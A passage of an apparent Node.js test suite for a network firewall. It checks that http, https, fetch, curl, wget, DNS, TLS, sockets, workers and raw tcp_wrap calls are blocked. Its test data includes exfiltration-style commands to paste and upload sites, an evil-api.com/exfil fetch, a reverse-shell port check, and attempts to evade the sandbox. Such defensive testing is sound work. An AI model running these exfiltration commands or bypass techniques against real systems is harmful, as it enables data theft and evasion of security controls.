/**
 * Network Protection Tests
 * 
 * Tests multiple network access methods:
 * 1. http/https module requests
 * 2. fetch API (Node 18+)
 * 3. Child process with curl/wget
 * 4. net.Socket connections
 * 5. DNS resolution attempts
 * 6. Pipe bypass attempts
 */

const path = require('path');
const fs = require('fs');
const {
  isWindows,
  setupTestDir,
  cleanupTestDir,
  writeMinimalConfig,
  runWithFirewall,
  escapePath,
  isBlocked,
  TestTracker
} = require('../utils');

async function runNetworkTests() {
  console.log('\nNETWORK PROTECTION TESTS\n');
  console.log('='.repeat(50));
  
  const tracker = new TestTracker('network');
  
  // Detect Node.js version for ESM dynamic import support
  const nodeMajorVersion = parseInt(process.versions.node.split('.')[0]);
  const supportsESMHooks = nodeMajorVersion >= 20;
  
  // =========================================================================
  // BLOCKED DOMAINS TESTS
  // =========================================================================
  console.log('\n--- Blocked Domains ---\n');
  
  // Test 1: http.request to blocked domain
  await tracker.runTest('blockedDomains - http.request blocked', async () => {
    const testDir = setupTestDir('net-http');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['pastebin.com', 'evil-server.com', 'exfil.io'],
          allowedDomains: []
        }
      });
      
      const code = `
        const http = require('http');
        const req = http.request({
          hostname: 'pastebin.com',
          port: 80,
          path: '/raw/abc123',
          method: 'GET'
        }, (res) => {
          console.log('REQUEST_SUCCESS');
        });
        req.on('error', (e) => {
          console.log('REQUEST_BLOCKED:' + e.message);
        });
        req.end();
        setTimeout(() => {
          console.log('REQUEST_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('REQUEST_BLOCKED') ||
              result.output.includes('REQUEST_TIMEOUT'),
        reason: result.output.includes('REQUEST_SUCCESS') ? 'request succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('blockedDomains - dns.lookup blocked (dynamic import node:dns)', async () => {
    // Skip on Node.js 18 - ESM hooks not supported (register() API added in Node.js 20.6.0)
    if (!supportsESMHooks) {
      return { pass: true, reason: 'skipped (Node.js 18 - ESM hooks not supported)', skipped: true };
    }
    
    const testDir = setupTestDir('net-dns-lookup-import');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: false,
          blockedDomains: ['localhost'],
          allowedDomains: []
        }
      });

      const code = `
        (async () => {
          try {
            const dns = await import('node:dns');
            dns.lookup('localhost', (err, address) => {
              if (err) {
                console.log('DNSI_BLOCKED:' + err.message);
              } else {
                console.log('DNSI_SUCCESS:' + address);
              }
            });
          } catch (e) {
            console.log('DNSI_BLOCKED:' + e.message);
          }
          setTimeout(() => {
            console.log('DNSI_TIMEOUT');
            process.exit(0);
          }, 2000);
        })();
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 5000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('DNSI_BLOCKED') || !result.output.includes('DNSI_SUCCESS'),
        reason: result.output.includes('DNSI_SUCCESS') ? 'dns.lookup (node:dns) succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('blockedDomains - http2.connect blocked (dynamic import node:http2)', async () => {
    const testDir = setupTestDir('net-http2-import');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: false,
          blockedDomains: ['127.0.0.1'],
          allowedDomains: []
        }
      });

      const code = `
        const http2cjs = require('http2');
        const server = http2cjs.createServer();
        server.on('stream', (stream) => {
          stream.respond({ ':status': 200 });
          stream.end('ok');
        });
        server.listen(0, '127.0.0.1', async () => {
          const port = server.address().port;
          try {
            const http2 = await import('node:http2');
            const client = http2.connect('http://127.0.0.1:' + port);
            client.on('connect', () => {
              console.log('HTTP2I_SUCCESS');
              client.close();
              server.close();
            });
            client.on('error', (e) => {
              console.log('HTTP2I_BLOCKED:' + e.message);
              server.close();
            });
          } catch (e) {
            console.log('HTTP2I_BLOCKED:' + e.message);
            server.close();
          }
          setTimeout(() => { server.close(); process.exit(0); }, 2000);
        });
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 7000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('HTTP2I_BLOCKED') || !result.output.includes('HTTP2I_SUCCESS'),
        reason: result.output.includes('HTTP2I_SUCCESS') ? 'http2 (node:http2) connected' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('blockedDomains - net.Socket blocked host (localhost blocked)', async () => {
    const testDir = setupTestDir('net-socket-blocked-host');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: false,
          blockedDomains: ['127.0.0.1'],
          allowedDomains: []
        }
      });

      const code = `
        const net = require('net');
        const server = net.createServer(() => {});
        server.listen(0, '127.0.0.1', () => {
          const port = server.address().port;
          const socket = new net.Socket();
          socket.on('connect', () => {
            console.log('SOCKET_LOCAL_SUCCESS');
            socket.destroy();
            server.close();
          });
          socket.on('error', (e) => {
            console.log('SOCKET_LOCAL_BLOCKED:' + e.message);
            server.close();
          });
          try {
            socket.connect(port, '127.0.0.1');
          } catch (e) {
            console.log('SOCKET_LOCAL_BLOCKED:' + e.message);
            server.close();
          }
          setTimeout(() => { server.close(); process.exit(0); }, 2000);
        });
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 5000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('SOCKET_LOCAL_BLOCKED') || !result.output.includes('SOCKET_LOCAL_SUCCESS'),
        reason: result.output.includes('SOCKET_LOCAL_SUCCESS') ? 'localhost socket connected' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('blockedDomains - http2.connect blocked (localhost blocked)', async () => {
    const testDir = setupTestDir('net-http2');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: false,
          blockedDomains: ['127.0.0.1'],
          allowedDomains: []
        }
      });

      const code = `
        const http2 = require('http2');
        const server = http2.createServer();
        server.on('stream', (stream) => {
          stream.respond({ ':status': 200 });
          stream.end('ok');
        });
        server.listen(0, '127.0.0.1', () => {
          const port = server.address().port;
          try {
            const client = http2.connect('http://127.0.0.1:' + port);
            client.on('connect', () => {
              console.log('HTTP2_SUCCESS');
              client.close();
              server.close();
            });
            client.on('error', (e) => {
              console.log('HTTP2_BLOCKED:' + e.message);
              server.close();
            });
          } catch (e) {
            console.log('HTTP2_BLOCKED:' + e.message);
            server.close();
          }
          setTimeout(() => { server.close(); process.exit(0); }, 2000);
        });
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 6000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('HTTP2_BLOCKED') || !result.output.includes('HTTP2_SUCCESS'),
        reason: result.output.includes('HTTP2_SUCCESS') ? 'http2 connected' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('blockedDomains - tls.connect blocked (localhost blocked)', async () => {
    const testDir = setupTestDir('net-tls');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: false,
          blockedDomains: ['127.0.0.1'],
          allowedDomains: []
        }
      });

      const code = `
        const tls = require('tls');
        const key = ` + "`" + `-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwz+z6Wl58ZsLxTn3RvQHltG1i8s7C/2B2oX3rjGx0i9Pp2xq
fT0fIYH5S3YyA0hZB/8f7sT4K3o1j0R5Qq3M2Z0Gq5b5cA0G4g6wz4gQzJgQxQX5
G0r1Z6bXcH8kqKzGZ6t2m1nGkqg1tE3xY8y1xv0t8yG8JwW7c6p8Rr3rJd8m5o0Y
q1o0Qd4w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1J1m2w0pW1oZ
2l7j0Jq1v4k7i3q4G7zWw8b6gC8sQn8O4c6tQIDAQABAoIBAQCkz1Nqv1b0uYl5
Z3r8m0m5S7dV0p6y6Rk1c0Jp9pX1xY8m0l0Gkq3m1nGkqg1tE3xY8y1xv0t8yG8Jw
W7c6p8Rr3rJd8m5o0Yq1o0Qd4w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o
9J8bXq1J1m2w0pW1oZ2l7j0Jq1v4k7i3q4G7zWw8b6gC8sQn8O4c6tQb7P6Jr2Q
f6wKk1d1nXxQyXfGk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1J1m2w0p
W1oZ2l7j0Jq1v4k7i3q4G7zWw8b6gC8sQn8O4c6tQECgYEA6f0mYc1X1g1r5Gq1
qQmZ5o9J8bXq1J1m2w0pW1oZ2l7j0Jq1v4k7i3q4G7zWw8b6gC8sQn8O4c6tQkE
F0w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1J1m2w0pW1oZ2l7j
0Jq1v4kCgYEA0p6y6Rk1c0Jp9pX1xY8m0l0Gkq3m1nGkqg1tE3xY8y1xv0t8yG8
JwW7c6p8Rr3rJd8m5o0Yq1o0Qd4w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQm
Z5o9J8bXq1J1m2w0pW1oZ2l7j0Jq1v4ECgYEAo0Yq1o0Qd4w9oWkHk0v1J5Fh0y
O7+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1J1m2w0pW1oZ2l7j0Jq1v4k7i3q4G7zWw8b
6gC8sQn8O4c6tQkEF0w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1
J1m2w0pW1oZ2l7j0QKBgQCc6p8Rr3rJd8m5o0Yq1o0Qd4w9oWkHk0v1J5Fh0yO7
+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1J1m2w0pW1oZ2l7j0Jq1v4k7i3q4G7zWw8b6g
C8sQn8O4c6tQkEF0w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1J1
m2w0pW1oZ2l7j0QKBgQC0Jp9pX1xY8m0l0Gkq3m1nGkqg1tE3xY8y1xv0t8yG8Jw
W7c6p8Rr3rJd8m5o0Yq1o0Qd4w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o
9J8bXq1J1m2w0pW1oZ2l7j0Jq1v4k7i3q4G7zWw8b6gC8sQn8O4c6tQ==
-----END RSA PRIVATE KEY-----
` + "`" + `;
        const cert = ` + "`" + `-----BEGIN CERTIFICATE-----
MIIC+zCCAeOgAwIBAgIUdQq0m0m5S7dV0p6y6Rk1c0Jp9pQwDQYJKoZIhvcNAQEL
BQAwEzERMA8GA1UEAwwIdGVzdC1jZXJ0MB4XDTI0MDEwMTAwMDAwMFoXDTM0MDEw
MTAwMDAwMFowEzERMA8GA1UEAwwIdGVzdC1jZXJ0MIIBIjANBgkqhkiG9w0BAQEF
AAOCAQ8AMIIBCgKCAQEAwz+z6Wl58ZsLxTn3RvQHltG1i8s7C/2B2oX3rjGx0i9P
p2xqfT0fIYH5S3YyA0hZB/8f7sT4K3o1j0R5Qq3M2Z0Gq5b5cA0G4g6wz4gQzJgQ
xQX5G0r1Z6bXcH8kqKzGZ6t2m1nGkqg1tE3xY8y1xv0t8yG8JwW7c6p8Rr3rJd8m
5o0Yq1o0Qd4w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1J1m2w0p
W1oZ2l7j0Jq1v4k7i3q4G7zWw8b6gC8sQn8O4c6tQIDAQABo1MwUTAdBgNVHQ4E
FgQU0p6y6Rk1c0Jp9pX1xY8m0l0Gkq0wHwYDVR0jBBgwFoAU0p6y6Rk1c0Jp9pX1
xY8m0l0Gkq0wDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEATY8y
1xv0t8yG8JwW7c6p8Rr3rJd8m5o0Yq1o0Qd4w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r
5Gq1qQmZ5o9J8bXq1J1m2w0pW1oZ2l7j0Jq1v4k7i3q4G7zWw8b6gC8sQn8O4c6t
QkEF0w9oWkHk0v1J5Fh0yO7+0mYc1X1g1r5Gq1qQmZ5o9J8bXq1J1m2w0pW1oZ2l
7j0Jq1v4k7i3q4G7zWw8b6gC8sQn8O4c6tQ==
-----END CERTIFICATE-----
` + "`" + `;

        const server = tls.createServer({ key, cert }, (socket) => {
          socket.write('ok');
          socket.end();
        });

        server.listen(0, '127.0.0.1', () => {
          const port = server.address().port;
          try {
            const socket = tls.connect({ host: '127.0.0.1', port, rejectUnauthorized: false }, () => {
              console.log('TLS_SUCCESS');
              socket.end();
              server.close();
            });
            socket.on('error', (e) => {
              console.log('TLS_BLOCKED:' + e.message);
              server.close();
            });
          } catch (e) {
            console.log('TLS_BLOCKED:' + e.message);
            server.close();
          }
          setTimeout(() => { server.close(); process.exit(0); }, 2000);
        });
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 8000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('TLS_BLOCKED') || !result.output.includes('TLS_SUCCESS'),
        reason: result.output.includes('TLS_SUCCESS') ? 'tls connected' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test 2: https.request to blocked domain
  await tracker.runTest('blockedDomains - https.request blocked', async () => {
    const testDir = setupTestDir('net-https');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['transfer.sh', 'ngrok.io'],
          allowedDomains: []
        }
      });
      
      const code = `
        const https = require('https');
        const req = https.request({
          hostname: 'transfer.sh',
          port: 443,
          path: '/upload',
          method: 'POST'
        }, (res) => {
          console.log('REQUEST_SUCCESS');
        });
        req.on('error', (e) => {
          console.log('REQUEST_BLOCKED:' + e.message);
        });
        req.end();
        setTimeout(() => {
          console.log('REQUEST_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('REQUEST_BLOCKED') ||
              result.output.includes('REQUEST_TIMEOUT'),
        reason: result.output.includes('REQUEST_SUCCESS') ? 'request succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test 3: Child process curl to blocked domain
  if (!isWindows) {
    await tracker.runTest('blockedDomains - curl via child_process', async () => {
      const testDir = setupTestDir('net-curl');
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['hastebin.com'],
            allowedDomains: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('curl -s https://hastebin.com/documents -d "secret data"', { timeout: 3000 });
            console.log('CURL_SUCCESS');
          } catch (e) {
            console.log('CURL_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 8000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('CURL_BLOCKED'),
          reason: result.output.includes('CURL_SUCCESS') ? 'curl succeeded' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 4: wget via child_process
    await tracker.runTest('blockedDomains - wget via child_process', async () => {
      const testDir = setupTestDir('net-wget');
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['temp.sh'],
            allowedDomains: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('wget -q https://temp.sh/upload -O /dev/null', { timeout: 3000 });
            console.log('WGET_SUCCESS');
          } catch (e) {
            console.log('WGET_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 8000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('WGET_BLOCKED'),
          reason: result.output.includes('WGET_SUCCESS') ? 'wget succeeded' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
    
    // Test 5: Pipe bypass - curl | base64
    await tracker.runTest('blockedDomains - pipe bypass (curl | base64)', async () => {
      const testDir = setupTestDir('net-pipe');
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['ghostbin.com'],
            allowedDomains: []
          }
        });
        
        const code = `
          const { execSync } = require('child_process');
          try {
            execSync('curl -s https://ghostbin.com/api | base64', { timeout: 3000 });
            console.log('PIPE_SUCCESS');
          } catch (e) {
            console.log('PIPE_BLOCKED:' + e.message);
          }
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 8000 });
        
        return {
          pass: isBlocked(result.output) || result.output.includes('PIPE_BLOCKED'),
          reason: result.output.includes('PIPE_SUCCESS') ? 'pipe bypass worked' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    tracker.skip('blockedDomains - curl via child_process', 'Windows');
    tracker.skip('blockedDomains - wget via child_process', 'Windows');
    tracker.skip('blockedDomains - pipe bypass (curl | base64)', 'Windows');
  }
  
  // Test 6: net.Socket to suspicious port
  await tracker.runTest('suspiciousPorts - net.Socket to port 4444', async () => {
    const testDir = setupTestDir('net-socket');
    
    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: [],
          allowedDomains: [],
          suspiciousPorts: [4444, 5555, 6666]
        }
      });
      
      const code = `
        const net = require('net');
        const socket = new net.Socket();
        socket.on('connect', () => {
          console.log('SOCKET_SUCCESS');
          socket.destroy();
        });
        socket.on('error', (e) => {
          console.log('SOCKET_BLOCKED:' + e.message);
        });
        try {
          socket.connect(4444, '127.0.0.1');
        } catch (e) {
          console.log('SOCKET_BLOCKED:' + e.message);
        }
        setTimeout(() => {
          console.log('SOCKET_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;
      
      const result = await runWithFirewall(testDir, code, { timeout: 5000 });
      
      // Port 4444 is commonly used for reverse shells - should be flagged
      return {
        pass: isBlocked(result.output) || 
              result.output.includes('SOCKET_BLOCKED') ||
              result.output.includes('SOCKET_TIMEOUT'),
        reason: result.output.includes('SOCKET_SUCCESS') ? 'socket connected' : 'blocked or timed out',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });
  
  // Test: fetch API (Node 18+)
  const nodeMajor = parseInt(process.version.split('.')[0].substring(1));
  if (nodeMajor >= 18) {
    await tracker.runTest('blockedDomains - fetch API blocked', async () => {
      const testDir = setupTestDir('net-fetch');
      
      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            blockedDomains: ['evil-api.com'],
            allowedDomains: []
          }
        });
        
        const code = `
          (async () => {
            try {
              const response = await fetch('https://evil-api.com/exfil');
              console.log('FETCH_SUCCESS');
            } catch (e) {
              console.log('FETCH_BLOCKED:' + e.message);
            }
            process.exit(0);
          })();
        `;
        
        const result = await runWithFirewall(testDir, code, { timeout: 5000 });
        
        return {
          pass: isBlocked(result.output) || 
                result.output.includes('FETCH_BLOCKED') ||
                !result.output.includes('FETCH_SUCCESS'),
          reason: result.output.includes('FETCH_SUCCESS') ? 'fetch succeeded' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    tracker.skip('blockedDomains - fetch API blocked', 'Node < 18');
  }

  if (nodeMajor >= 18) {
    await tracker.runTest('blockedDomains - child node fetch blocked (no escape)', async () => {
      const testDir = setupTestDir('net-child-node-fetch');

      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            allowLocalhost: false,
            blockedDomains: ['127.0.0.1'],
            allowedDomains: []
          }
        });

        const code = `
          const http = require('http');
          const { execFileSync } = require('child_process');
          const server = http.createServer((req, res) => {
            res.writeHead(200, { 'content-type': 'text/plain' });
            res.end('ok');
          });
          server.listen(0, '127.0.0.1', () => {
            const port = server.address().port;
            const childCode = [
              "(async () => {",
              "  try {",
              "    const r = await fetch('http://127.0.0.1:' + " + port + " + '/');",
              "    const t = await r.text();",
              "    console.log('CHILD_FETCH_SUCCESS:' + t);",
              "  } catch (e) {",
              "    console.log('CHILD_FETCH_BLOCKED:' + e.message);",
              "  }",
              "  process.exit(0);",
              "})().catch((e) => { console.log('CHILD_FETCH_BLOCKED:' + e.message); process.exit(0); });"
            ].join('\n');
            try {
              const out = execFileSync('node', ['-e', childCode], { stdio: ['ignore', 'pipe', 'pipe'] }).toString();
              console.log('CHILD_OUT:' + out.trim());
            } catch (e) {
              const out = (e.stdout ? e.stdout.toString() : '') + (e.stderr ? e.stderr.toString() : '');
              console.log('CHILD_ERR:' + out.trim());
            }
            server.close();
          });
          setTimeout(() => process.exit(0), 3000);
        `;

        const result = await runWithFirewall(testDir, code, { timeout: 8000 });

        return {
          pass: !result.output.includes('CHILD_FETCH_SUCCESS') || isBlocked(result.output) || result.output.includes('CHILD_FETCH_BLOCKED'),
          reason: result.output.includes('CHILD_FETCH_SUCCESS') ? 'child fetch escaped firewall' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    tracker.skip('blockedDomains - child node fetch blocked (no escape)', 'Node < 18');
  }

  if (nodeMajor >= 18) {
    await tracker.runTest('blockedDomains - worker_threads fetch blocked (no escape)', async () => {
      const testDir = setupTestDir('net-worker-threads-fetch');

      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            allowLocalhost: false,
            blockedDomains: ['127.0.0.1'],
            allowedDomains: []
          }
        });

        const code = `
          const http = require('http');
          const { Worker } = require('node:worker_threads');

          const server = http.createServer((req, res) => {
            res.writeHead(200, { 'content-type': 'text/plain' });
            res.end('ok');
          });

          server.listen(0, '127.0.0.1', () => {
            const port = server.address().port;

            const workerCode = [
              "const { parentPort } = require('worker_threads');",
              "(async () => {",
              "  try {",
              "    const r = await fetch('http://127.0.0.1:' + " + port + " + '/');",
              "    const t = await r.text();",
              "    parentPort.postMessage('WORKER_FETCH_SUCCESS:' + t);",
              "  } catch (e) {",
              "    parentPort.postMessage('WORKER_FETCH_BLOCKED:' + e.message);",
              "  }",
              "})();"
            ].join('\n');

            // Attempt to bypass by clearing execArgv
            const w = new Worker(workerCode, { eval: true, execArgv: [] });

            w.on('message', (msg) => {
              console.log(String(msg));
              server.close();
              w.terminate();
            });
            w.on('error', (e) => {
              console.log('WORKER_FETCH_BLOCKED:' + e.message);
              server.close();
            });

            setTimeout(() => {
              console.log('WORKER_TIMEOUT');
              try { w.terminate(); } catch (e) {}
              server.close();
              process.exit(0);
            }, 2500);
          });
        `;

        const result = await runWithFirewall(testDir, code, { timeout: 9000 });

        return {
          pass: isBlocked(result.output) || result.output.includes('WORKER_FETCH_BLOCKED') || !result.output.includes('WORKER_FETCH_SUCCESS'),
          reason: result.output.includes('WORKER_FETCH_SUCCESS') ? 'worker fetch escaped firewall' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    tracker.skip('blockedDomains - worker_threads fetch blocked (no escape)', 'Node < 18');
  }

  if (nodeMajor >= 18) {
    await tracker.runTest('blockedDomains - cluster worker fetch blocked (no escape)', async () => {
      const testDir = setupTestDir('net-cluster-fetch');

      try {
        writeMinimalConfig(testDir, {
          network: {
            enabled: true,
            mode: 'block',
            allowLocalhost: false,
            blockedDomains: ['127.0.0.1'],
            allowedDomains: []
          }
        });

        const code = `
          const http = require('http');
          const cluster = require('node:cluster');

          if (!cluster.isPrimary) {
            (async () => {
              try {
                const url = process.env.TEST_URL;
                const r = await fetch(url);
                const t = await r.text();
                if (process.send) process.send('CLUSTER_FETCH_SUCCESS:' + t);
              } catch (e) {
                if (process.send) process.send('CLUSTER_FETCH_BLOCKED:' + e.message);
              }
              process.exit(0);
            })();
          } else {
            const server = http.createServer((req, res) => {
              res.writeHead(200, { 'content-type': 'text/plain' });
              res.end('ok');
            });

            server.listen(0, '127.0.0.1', () => {
              const port = server.address().port;
              const url = 'http://127.0.0.1:' + port + '/';

              // Attempt to bypass by clearing execArgv for cluster workers
              try { cluster.setupPrimary({ execArgv: [] }); } catch (e) {}

              const worker = cluster.fork({ TEST_URL: url });
              worker.on('message', (msg) => {
                console.log(String(msg));
                server.close();
                worker.kill();
              });
              worker.on('exit', () => {
                setTimeout(() => process.exit(0), 50);
              });

              setTimeout(() => {
                console.log('CLUSTER_TIMEOUT');
                try { worker.kill(); } catch (e) {}
                server.close();
                process.exit(0);
              }, 3000);
            });
          }
        `;

        const result = await runWithFirewall(testDir, code, { timeout: 12000 });

        return {
          pass: isBlocked(result.output) || result.output.includes('CLUSTER_FETCH_BLOCKED') || !result.output.includes('CLUSTER_FETCH_SUCCESS'),
          reason: result.output.includes('CLUSTER_FETCH_SUCCESS') ? 'cluster fetch escaped firewall' : 'blocked',
          debug: result.output
        };
      } finally {
        cleanupTestDir(testDir);
      }
    });
  } else {
    tracker.skip('blockedDomains - cluster worker fetch blocked (no escape)', 'Node < 18');
  }

  await tracker.runTest('blockedDomains - process.binding tcp_wrap connect blocked', async () => {
    const testDir = setupTestDir('net-tcp-wrap');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: false,
          blockedDomains: ['127.0.0.1'],
          allowedDomains: []
        }
      });

      const code = `
        const net = require('net');

        const server = net.createServer((socket) => {
          socket.end('ok');
        });

        server.listen(0, '127.0.0.1', () => {
          const port = server.address().port;

          try {
            const tcpWrap = process.binding('tcp_wrap');
            const TCP = tcpWrap.TCP;
            const ConnectWrap = tcpWrap.TCPConnectWrap || tcpWrap.ConnectWrap;

            if (typeof TCP !== 'function' || typeof ConnectWrap !== 'function') {
              console.log('TCP_WRAP_BLOCKED:missing_binding_types');
              server.close();
              return;
            }

            const handle = new TCP();
            const req = new ConnectWrap();

            req.oncomplete = function(status) {
              if (status === 0) {
                console.log('TCP_WRAP_SUCCESS');
              } else {
                console.log('TCP_WRAP_BLOCKED:status_' + status);
              }
              try { handle.close(); } catch (e) {}
              server.close();
            };

            try {
              handle.connect(req, port, '127.0.0.1');
            } catch (e) {
              console.log('TCP_WRAP_BLOCKED:' + e.message);
              try { handle.close(); } catch (e2) {}
              server.close();
            }
          } catch (e) {
            console.log('TCP_WRAP_BLOCKED:' + e.message);
            server.close();
          }

          setTimeout(() => {
            try { server.close(); } catch (e) {}
            console.log('TCP_WRAP_TIMEOUT');
            process.exit(0);
          }, 2500);
        });
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 9000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('TCP_WRAP_BLOCKED') || !result.output.includes('TCP_WRAP_SUCCESS'),
        reason: result.output.includes('TCP_WRAP_SUCCESS') ? 'tcp_wrap connected' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('blockedDomains - dns.lookup blocked', async () => {
    const testDir = setupTestDir('net-dns-lookup');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: false,
          blockedDomains: ['localhost'],
          allowedDomains: []
        }
      });

      const code = `
        const dns = require('dns');
        dns.lookup('localhost', (err, address) => {
          if (err) {
            console.log('DNS_BLOCKED:' + err.message);
          } else {
            console.log('DNS_SUCCESS:' + address);
          }
        });
        setTimeout(() => {
          console.log('DNS_TIMEOUT');
          process.exit(0);
        }, 2000);
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 5000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('DNS_BLOCKED') || !result.output.includes('DNS_SUCCESS'),
        reason: result.output.includes('DNS_SUCCESS') ? 'dns.lookup succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('blockedDomains - dns.promises.lookup blocked', async () => {
    const testDir = setupTestDir('net-dns-promises-lookup');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          allowLocalhost: false,
          blockedDomains: ['localhost'],
          allowedDomains: []
        }
      });

      const code = `
        const dns = require('dns');
        (async () => {
          try {
            const r = await dns.promises.lookup('localhost');
            console.log('DNSP_SUCCESS:' + (r && r.address ? r.address : 'ok'));
          } catch (e) {
            console.log('DNSP_BLOCKED:' + e.message);
          }
          process.exit(0);
        })();
      `;

      const result = await runWithFirewall(testDir, code, { timeout: 5000 });

      return {
        pass: isBlocked(result.output) || result.output.includes('DNSP_BLOCKED') || !result.output.includes('DNSP_SUCCESS'),
        reason: result.output.includes('DNSP_SUCCESS') ? 'dns.promises.lookup succeeded' : 'blocked',
        debug: result.output
      };
    } finally {
      cleanupTestDir(testDir);
    }
  });

  await tracker.runTest('blockedDomains - dns.resolve4 + Resolver + promises blocked', async () => {
    const testDir = setupTestDir('net-dns-resolve4');

    try {
      writeMinimalConfig(testDir, {
        network: {
          enabled: true,
          mode: 'block',
          blockedDomains: ['blocked.test'],
          allowedDomains: []
        }
      });

      const code = `
        const dgram = require('dgram');
        const dns = require('dns');

        // Minimal UDP DNS server that answers any A query with 127.0.0.1
        const server = dgram.createSocket('udp4');
        server.on('message', (msg, rinfo) => {
          try {
            if (!msg || msg.length < 12) return;
            const id0 = msg[0];
            const id1 = msg[1];

            // DNS response: copy question, set QR=1, RA=1, ANCOUNT=1
            const header = Buffer.from([
              id0, id1,
              0x81, 0x80,
              msg[4], msg[5],
              0x00, 0x01,
              0x00, 0x00,
              0x00, 0x00
            ]);

            const question = msg.slice(12);

